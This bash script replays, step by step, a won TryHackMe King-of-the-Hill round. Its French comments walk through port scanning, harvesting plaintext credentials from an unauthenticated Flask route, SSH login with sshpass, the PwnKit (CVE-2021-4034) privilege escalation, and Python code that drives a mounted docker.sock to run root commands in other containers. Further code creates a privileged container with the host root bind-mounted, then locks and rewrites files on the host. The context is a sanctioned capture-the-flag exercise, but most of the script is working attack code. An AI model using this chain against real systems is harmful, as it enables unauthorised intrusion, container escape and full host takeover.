#!/usr/bin/env bash
# koth_round1_h1hard_replay.sh — Rejeu complet, etape par etape, du round
# TryHackMe KotH "H1:Hard" gagne le 2026-10-30 (1er, 450 pts vs 390).
#
# Ceci N'EST PAS un outil generique (voir koth_auto.sh pour ca) — c'est la
# chaine EXACTE qui a marche sur CETTE box precise, conservee comme reference
# detaillee. Sur une nouvelle box, les ports/creds/vulns seront differents ;
# utilise ce script pour COMPRENDRE le raisonnement etape par etape, pas pour
# le lancer tel quel sur une autre IP sans adapter chaque etape.
#
# Chaine complete (voir knowledge/writeups/misc/thm-koth-h1hard-docker-sock-host-escape.md) :
#   1. nmap -p- complet -> 7 ports (22,80,81,82,2222,8888,9999)
#   2. Port 8888 (Flask) /apps -> enumeration -> /users -> creds en clair
#   3. SSH port 2222 avec ces creds -> shell + 1er flag local
#   4. pkexec 0.105 vulnerable -> PwnKit (CVE-2021-4034) -> root
#   5. ps aux sans Apache/nginx local malgre nmap -> ce sont des CONTENEURS
#   6. Ports 80/81/82 deja defaces par l'adversaire au moment du test
#   7. /var/run/docker.sock monte en RW -> acces API Docker (python3, curl absent)
#   8. GET /containers/json -> 4 conteneurs (c1=80,c2=81,c3=82,c4=nous)
#   9. docker exec EN ROOT dans c1/c2/c3 via l'API -> 3 flags de plus
#  10. Port 9999 absent des 4 conteneurs -> 5e mecanisme, probablement host
#  11. Creation conteneur avec Binds=['/:/mnt_host'] -> evasion vers l'hote
#  12. /etc/systemd/system/koth.service + /usr/bin/koth lit /root/king.txt SUR L'HOTE
#  13. Ecriture king.txt sur l'hote -> prise de couronne confirmee
#  14. chattr +i echoue (pas de CAP_LINUX_IMMUTABLE dans ce conteneur)
#  15. L'adversaire verrouille le fichier en immutable -> nos ecritures echouent
#  16. Conteneur PRIVILEGIE (Privileged=true) -> chattr -i reussit -> on reprend
#  17. Boucle de maintien (reecriture toutes les 20s) -> King Time cumule
#  18. PIEGE : Cmd=['sleep','600'] meurt au bout de 600s -> utiliser 'sleep infinity'
#  19. Resultat : 1er, 450 pts / King Time 30, vs 390 pts / King Time 24.
#
# Usage:
#   ./koth_round1_h1hard_replay.sh <IP> <TEAM_NAME>
#   (lance etape par etape avec pause entre chaque — appuie sur Entree pour
#   avancer, ou Ctrl+C pour t'arreter et continuer a la main a partir de la.)
#
# Pre-requis locaux : sshpass, python3, docker CLI non necessaire (tout passe
# par le socket Docker DEPUIS la cible via python3).

set -uo pipefail

IP="${1:-}"
TEAM="${2:-}"

if [[ -z "$IP" || -z "$TEAM" ]]; then
    echo "Usage: $0 <IP> <TEAM_NAME>"
    exit 1
fi

C_G="\033[1;32m"; C_Y="\033[1;33m"; C_B="\033[1;34m"; C_N="\033[0m"
step()  { echo -e "\n${C_B}=== ETAPE $1 : $2 ===${C_N}"; }
ok()    { echo -e "${C_G}[+]${C_N} $*"; }
note()  { echo -e "${C_Y}[i]${C_N} $*"; }
pause() { read -rp "   -> Entree pour continuer, Ctrl+C pour arreter ici... "; }

OUTDIR="./koth_round1replay_${IP}_$(date +%s)"
mkdir -p "$OUTDIR"

# ============================================================
step 1 "Scan complet des ports"
# ============================================================
note "Commande exacte utilisee :"
echo "  sudo nmap --privileged -Pn -p- --min-rate 3000 -T4 --max-retries 1 $IP"
note "Resultat round 1 : 22(ssh), 80(http), 81(http), 82(http), 2222(ssh), 8888(http Flask), 9999(http Go)."
pause

sudo nmap --privileged -Pn -p- --min-rate 3000 -T4 --max-retries 1 -oN "$OUTDIR/ports.txt" "$IP" 2>&1 | tail -20
PORTS=$(grep -oE '^[0-9]+/tcp\s+open' "$OUTDIR/ports.txt" 2>/dev/null | grep -oE '^[0-9]+')
ok "Ports ouverts detectes : $PORTS"

# ============================================================
step 2 "Port 8888 (Flask) — enumeration /apps puis /users"
# ============================================================
note "Round 1 : /apps listait des applications nommees app1..app4 ; app4='/users'"
note "GET /users a renvoye les creds en clair : davelarkin:totallysecurehuh"
echo "  curl -s http://$IP:8888/apps"
echo "  curl -s http://$IP:8888/users"
pause

curl -s "http://$IP:8888/apps" | tee "$OUTDIR/apps.txt"
echo
curl -s "http://$IP:8888/users" | tee "$OUTDIR/users.txt"
note "Si cette box n'expose pas exactement ca : adapte le path, mais garde le reflexe"
note "'toute route qui liste des apps/users/devices merite un GET direct sans auth'."

read -rp "Username trouve (ou vide pour garder davelarkin) : " SSH_USER
SSH_USER="${SSH_USER:-davelarkin}"
read -rp "Password trouve (ou vide pour garder totallysecurehuh) : " SSH_PASS
SSH_PASS="${SSH_PASS:-totallysecurehuh}"
read -rp "Port SSH (round 1 = 2222) : " SSH_PORT
SSH_PORT="${SSH_PORT:-2222}"

# ============================================================
step 3 "SSH avec les creds trouvees + premier flag local"
# ============================================================
echo "  sshpass -p '$SSH_PASS' ssh -p $SSH_PORT $SSH_USER@$IP"
pause

if ! command -v sshpass >/dev/null; then
    note "sshpass manquant : sudo apt install sshpass"
else
    sshpass -p "$SSH_PASS" ssh -p "$SSH_PORT" -o StrictHostKeyChecking=no -o ConnectTimeout=6 "$SSH_USER@$IP" "
        id
        echo '--- recherche flag local ---'
        find / -xdev -iname 'flag*' 2>/dev/null -exec cat {} \;
        echo '--- version pkexec (PwnKit ?) ---'
        pkexec --version 2>&1
    " 2>&1 | tee "$OUTDIR/ssh_step3.txt"
fi

# ============================================================
step 4 "PwnKit (CVE-2021-4034) si pkexec vulnerable"
# ============================================================
note "Round 1 : pkexec 0.105 vulnerable. Exploit public : berdav/CVE-2021-4034."
note "PIEGE round 1 : l'exploit ouvre un shell root INTERACTIF qui bloque le"
note "terminal — toujours piper les commandes + 'exit' via stdin, jamais lancer"
note "l'exploit puis attendre une invite normale."
cat <<'EOF'
  # Sur ta machine (transfert via SSH scp ou wget) :
  git clone https://github.com/berdav/CVE-2021-4034
  cd CVE-2021-4034 && make
  scp -P <PORT> cve-2021-4034-poc <user>@<IP>:/tmp/
  ssh -p <PORT> <user>@<IP>

  # SUR LA CIBLE — piper les commandes, ne pas lancer interactif :
  chmod +x /tmp/cve-2021-4034-poc
  (echo "id"; echo "cat /root/king.txt 2>/dev/null"; echo "ls -la /var/run/docker.sock 2>/dev/null"; echo "exit") | /tmp/cve-2021-4034-poc
EOF
pause

# ============================================================
step 5 "Confirmer que 80/81/82 sont des conteneurs separes, pas des process locaux"
# ============================================================
note "Round 1 : 'ps aux' en root ne montrait AUCUN process Apache/nginx malgre"
note "nmap qui identifiait ces services sur ces ports -> ce sont des conteneurs."
echo "  (root)# ps aux | grep -iE 'apache|nginx'"
echo "  (root)# ls -la /var/run/docker.sock"
pause

# ============================================================
step 6 "Verifier si l'adversaire a deja defac les ports web"
# ============================================================
curl -s "http://$IP:80/" 2>/dev/null | grep -qi "hacked" && note "Port 80 deja defac — piste abandonnee, passer au docker.sock."
curl -s "http://$IP:81/" 2>/dev/null | grep -qi "hacked" && note "Port 81 deja defac."
curl -s "http://$IP:82/" 2>/dev/null | grep -qi "hacked" && note "Port 82 deja defac."
pause

# ============================================================
step 7 "docker.sock monte -> client Python (curl absent sur la cible)"
# ============================================================
note "A executer SUR LA CIBLE (via le shell root obtenu en etape 4) :"
cat <<'PYEOF'
python3 << 'EOF'
import json, socket, http.client

class DockerSockConn(http.client.HTTPConnection):
    def __init__(self):
        super().__init__("localhost")
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect("/var/run/docker.sock")

c = DockerSockConn()
c.request("GET", "/containers/json?all=true")
r = c.getresponse()
data = json.loads(r.read())
for cont in data:
    print(cont["Id"][:12], cont["Names"], cont.get("Ports"))
EOF
PYEOF
pause

# ============================================================
step 8 "Lister les 4 conteneurs (c1-c4) et identifier ceux de l'adversaire"
# ============================================================
note "Round 1 : c1=port80, c2=port81, c3=port82, c4=nous (notre propre conteneur)."
note "Garde les IDs completes retournees par l'etape 7 pour les etapes suivantes."
pause

# ============================================================
step 9 "docker exec EN ROOT dans c1/c2/c3 via l'API (contourne le lockdown applicatif)"
# ============================================================
note "A executer SUR LA CIBLE, pour CHAQUE <CID> trouve a l'etape 8 :"
cat <<'PYEOF'
python3 << 'EOF'
import json, socket, http.client

CID = "colle_id_conteneur_ici"

class DockerSockConn(http.client.HTTPConnection):
    def __init__(self):
        super().__init__("localhost")
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect("/var/run/docker.sock")

def docker_exec(cmd_list):
    c = DockerSockConn()
    body = json.dumps({"AttachStdout": True, "AttachStderr": True, "Cmd": cmd_list, "Tty": False})
    c.request("POST", f"/containers/{CID}/exec", body=body,
               headers={"Content-Type": "application/json"})
    exec_id = json.loads(c.getresponse().read())["Id"]

    c2 = DockerSockConn()
    c2.request("POST", f"/exec/{exec_id}/start", body=json.dumps({"Detach": False, "Tty": False}),
                headers={"Content-Type": "application/json"})
    print(c2.getresponse().read().decode(errors="replace"))

docker_exec(["sh", "-c", "find / -xdev -iname 'flag*' -o -iname 'king*' 2>/dev/null -exec cat {} \\;"])
EOF
PYEOF
note "Repeter pour chaque CID -> round 1 a donne 3 flags supplementaires ici."
pause

# ============================================================
step 10 "Port 9999 absent des 4 conteneurs -> 5e mecanisme, probablement sur l'hote"
# ============================================================
curl -s "http://$IP:9999/" 2>/dev/null | tee "$OUTDIR/port9999.txt"
note "Si ce port affiche un nom de king/roi actuel et n'apparait dans AUCUN"
note "conteneur liste a l'etape 8 -> c'est le signal qu'il faut evader vers l'hote."
pause

# ============================================================
step 11 "Creer un conteneur avec bind-mount de la racine hote -> evasion"
# ============================================================
note "A executer SUR LA CIBLE :"
cat <<'PYEOF'
python3 << 'EOF'
import json, socket, http.client

class DockerSockConn(http.client.HTTPConnection):
    def __init__(self):
        super().__init__("localhost")
    def connect(self):
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self.sock.connect("/var/run/docker.sock")

c = DockerSockConn()
body = json.dumps({
    "Image": "alpine",
    "Cmd": ["sleep", "infinity"],          # JAMAIS une duree finie (piege round 1)
    "HostConfig": {
        "Binds": ["/:/mnt_host"],
        "Privileged": True                 # necessaire pour chattr plus tard
    }
})
c.request("POST", "/containers/create", body=body, headers={"Content-Type": "application/json"})
cid = json.loads(c.getresponse().read())["Id"]
print("Conteneur cree:", cid)

c2 = DockerSockConn()
c2.request("POST", f"/containers/{cid}/start")
print(c2.getresponse().read())
print("CID a reutiliser pour les etapes suivantes:", cid)
EOF
PYEOF
pause

# ============================================================
step 12 "Trouver le VRAI mecanisme king sur l'hote"
# ============================================================
note "Round 1 : /etc/systemd/system/koth.service (ExecStart=/usr/bin/koth, User=root)"
note "          lisait /root/king.txt SUR L'HOTE — invisible depuis les 4 conteneurs."
note "Commande (docker_exec du conteneur hostescape cree en etape 11) :"
echo "  cat /mnt_host/etc/systemd/system/koth.service"
echo "  ls -la /mnt_host/root/"
pause

# ============================================================
step 13 "Ecrire le king sur l'hote -> prise de couronne"
# ============================================================
echo "  echo '$TEAM' > /mnt_host/root/king.txt   # (via docker_exec dans le conteneur hostescape)"
note "Verifier immediatement sur le scoreboard que 'Changements du roi' augmente."
pause

# ============================================================
step 14-16 "Guerre de verrouillage chattr +i/-i"
# ============================================================
step "14-16" "Guerre de verrouillage chattr (voir koth-continuous-king-reassertion-loop.md)"
note "14. chattr +i depuis un conteneur NON privilegie echoue (pas de CAP_LINUX_IMMUTABLE)."
note "15. L'adversaire verrouille /root/king.txt en immutable -> nos ecritures echouent."
note "16. Un conteneur Privileged=true (etape 11) a TOUTES les capabilities -> chattr -i marche."
echo "  chattr -i /mnt_host/root/king.txt && echo '$TEAM' > /mnt_host/root/king.txt && chattr +i /mnt_host/root/king.txt"
pause

# ============================================================
step 17 "Boucle de maintien — LE FACTEUR DECISIF"
# ============================================================
note "Reecriture toutes les 20s pendant tout le reste du round."
note "Utilise koth_auto.sh --holdking pour cette partie (voir ce script)."
echo "  nohup ../koth_auto.sh --holdking $IP $TEAM $SSH_USER '$SSH_PASS' $SSH_PORT 20 > koth_holdking.log 2>&1 &"
pause

# ============================================================
step 18 "PIEGE a eviter : Cmd avec duree finie"
# ============================================================
note "Cmd=['sleep','600'] -> le conteneur MEURT au bout de 600s, tout exec()"
note "ulterieur echoue avec 'Container is not running'. TOUJOURS utiliser"
note "Cmd=['sleep','infinity'] + RestartPolicy={'Name':'always'} pour un"
note "conteneur de travail destine a durer tout le round."

echo
ok "=== FIN DU REJEU ETAPE PAR ETAPE ==="
ok "Resultat round 1 reel : 1er, 450 pts / King Time 30 (vs 390 pts / King Time 24)."
note "Logs de cette session dans $OUTDIR/"
note "Reference complete : knowledge/writeups/misc/thm-koth-h1hard-docker-sock-host-escape.md"
note "Patterns generiques extraits : knowledge/patterns/misc/docker-sock-mounted-container-host-escape.md"
note "                                knowledge/patterns/misc/koth-continuous-king-reassertion-loop.md"
